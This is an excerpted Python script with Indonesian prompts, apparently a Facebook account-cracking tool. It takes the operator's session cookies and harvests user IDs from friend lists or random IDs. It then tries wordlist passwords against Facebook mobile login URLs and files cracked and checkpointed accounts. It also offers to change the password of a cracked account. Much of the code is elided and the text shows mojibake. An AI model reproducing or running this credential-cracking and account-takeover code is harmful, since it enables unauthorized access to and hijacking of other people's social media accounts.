...
try:
     ...
     print('\t â€¢ Please wait...') ; time.sleep(0.03) ; os.system('pip install rich')
try:
     import requests
except (ModuleNotFoundError,ImportError):
     print('\t â€¢ Please wait...') ; time.sleep(0.03) ; os.system('pip install requests')
try:
     import bs4
except (ModuleNotFoundError,ImportError):
     print('\t â€¢ Please wait...') ; time.sleep(0.03) ; os.system('pip install bs4')
...
komen    = random.choice(
	 ['hello bangðŸ˜Ž','Keren Suhu','Salam kenal bangâ™¥','Keren anjay','Kelazz','Pro kntl bangðŸ˜Ž','Sehat selalu bangâ™¥','mantap bangðŸ˜Ž']
)
...
def CekResults():
    ...
    zprint('â•­â”€â”€â–¸ [bold white]Pilih salah satu')
    ok_cp = console.input('â•°â”€â”€â–¸ :smiley: : ')
    if ok_cp in ['1','01']:
       print('\r')
       try:ok = os.listdir('OK')
       except:zprint('\n [red][[white]Ã—[red]] [white]File tidak ada') ; exit(0)
       for i in ok:
           exex.append(i)
           exei +=1
...
def ChekOption():
    ...
    zprint('â•­â”€â”€â–¸ [bold white]Pilih menu di atas')
    ask = console.input('â•°â”€â”€â–¸ pilihan : ')
    if ask in ['1','01']:
         ...
         zprint('â•­â”€â”€â–¸ [bold white]Harap di baca biar gak eror')
         user = console.input('â•°â”€â”€â–¸ username|password : ')
         ...
         zprint('â•­â”€â”€â–¸ [bold white] Nama file nya ?')
         file = console.input('â•°â”€â”€â–¸ nama file : ')
         try:cp=open('CP/'+file,'r').readlines()
         except:exit('\n [Ã—] File tidak ada cok!')
         for i in cp:
             asu = i.replace('\n','')
             itu = asu.split('|')
             print('\n [?] Mengechek akun : {}|{}'.format(itu[0],itu[1]))
             CekOptionAcount(itu[0],itu[1])
         exit('\n [âœ“] Proses cek akun chekpoint telah selesai...')
    else:
         menu()
		...
		if "checkpoint" in ses.cookies.get_dict():
			...
			if len(opsi) == 0:
				if "Lihat detail login yang ditampilkan. Ini Anda?" in str(cari.find("title").text):
					print(' [âœ“] Akun tap yes â™¥')

				elif "Masukkan Kode Masuk untuk Melanjutkan" in str(cari.find("title").text):
					print(" [Ã—] akun terpasang a2f")
				else:
					print(' [Ã—] Spam atau kata sandi salah!')
			else:
				for ketemu in opsi:
					print(f" [*] {ketemu.text}")
			...
			print(" [Ã—] Kata sandi yang anda masukan salah.")
	except Exception as e:
		pass

def Banner():
    KAGLK = '''[bold blue] ___   _   ___ ___ _   _ _    
 / __| /_\ |_ _| __| | | | |   
 \__ \/ _ \ | || _|| |_| | |__ 
 |___/_/ \_\___|_|  \___/|____|
                                                                                                                                             
                                                                                                                                             
 ( Di Buat oleh [bold green]Saiful ceo[bold white] ) '''
    Console(width=50).print(Panel(KAGLK,style='bold purple'),justify='center')

def Masuk():
    Clear_Terminal(platform) ; Banner()
    ask = '[bold white]Anda belum login. masukan cookie akun facebook anda tidak di sarankan pake akun utama!' ; Console(width=50).print(Panel(ask,style='bold purple')) ; zprint('â•­â”€â”€â–¸ [bold white]cookies')
    coki = file = console.input('â•°â”€â”€â–¸ [bold white]Masukan cookies : ')
    if coki in ['',' ']:Masuk()
    else:
          ...
          else:print('\n [Ã—] Cookie invalid!') ; time.sleep(2);Masuk()
...
[bold green][[bold white]0[bold green]]. [bold white]Keluar''') ; Console(width=50).print(Panel(list,style='bold purple'))
    zprint('â•­â”€â”€â–¸ [bold white]pilih menu')
    assk = console.input('â•°â”€â”€â–¸ [bold white]Yang mana : ')
    if assk in ['1','01']:
          Console(width=50).print(Panel('[bold white]Ketik me jika ingin crack dari daftar teman akun tumbal anda.',style='bold purple'))
          zprint('â•­â”€â”€â–¸ [bold white]Pastikan target publik.')
          id = console.input('â•°â”€â”€â–¸ [bold white]Masukan userid : ')
          try:
         ...
         zprint('â•­â”€â”€â–¸ [bold white]masukan nama terserah anda')
         nama = console.input('â•°â”€â”€â–¸ [bold white]Masukan nama terget : ')
...
[bold green][[bold white]3[bold green]]. [bold white]Crack dari ID random''') ; Console(width=50).print(Panel(exec ,style='bold purple'))
    zprint('â•­â”€â”€â–¸ [bold white]Di sarankan from ID new')
    idndi = console.input('â•°â”€â”€â–¸ [bold white]Atur id : ')
    if idndi in ['1','01']:
         for i in ID:
               ID2.append(i)
    elif idndi in ['2','02']:
...
[bold green][[bold white]3[bold green]]. [bold white]Crack dari methode validate password ''') ; Console(width=50).print(Panel(metod,style='bold purple'))
    zprint('â•­â”€â”€â–¸ [bold white]jika anda clone email tidak di sarankan memakai validate!')
    z = console.input('â•°â”€â”€â–¸ [bold white]Pilih : ')
...
[bold green][[bold white]3[bold green]]. [bold white]Crack dari mobile.facebook.com''') ; Console(width=50).print(Panel(exec ,style='bold purple'))
    zprint('â•­â”€â”€â–¸ [bold white]Silakan pilih [bold green]url login[bold white]')
    link = console.input('â•°â”€â”€â–¸ [bold white]Pilih : ')
    ...
    zprint('â•­â”€â”€â–¸ [bold white]Pilih Y/T ')
    ubah = console.input('â•°â”€â”€â–¸ [bold white]Ubah password : ')
    if ubah in ['y','Y','iya']:
          UbahPw.append('ya')
          add_Password = console.input('â•°â”€â”€â–¸ [bold white]Masukan password baru : [bold green]')
          if len(add_Password) <=5:
               exit('\n [Ã—] Password harus lebih dari 5 karaktaer contoh : sayang')
          else:
...
class WordlistLogin:
    ...
    def password(self,link):
        ...
        exit(f'\n\n [âœ“] Crack telah selesai OK:{len(OK)} CP:{len(CP)}')
